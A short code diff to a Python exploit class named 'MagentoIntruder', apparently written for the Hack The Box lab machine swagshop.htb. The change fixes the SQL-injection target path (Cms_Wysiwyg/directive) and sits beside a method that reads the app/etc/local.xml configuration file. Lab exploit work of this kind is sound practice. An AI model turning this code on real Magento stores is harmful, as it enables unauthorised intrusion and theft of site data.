@@ -20,7 +20,7 @@ class MagentoIntruder:
     def __init__(self, admin_login_url: str, domain: str = "http://swagshop.htb"):
         self.domain = domain
         self.url = f"{domain}/{admin_login_url}"
-        self.sqli_target = f"{admin_login_url}/Cms_Wysiwyg/directive/index/"
+        self.sqli_target = f"{self.url}/Cms_Wysiwyg/directive/index/"
 
     def infer_date_in_app_local_xml(self, app_local_xml: str = "app/etc/local.xml"):
         response = requests.get(f"{self.domain}/{app_local_xml}")
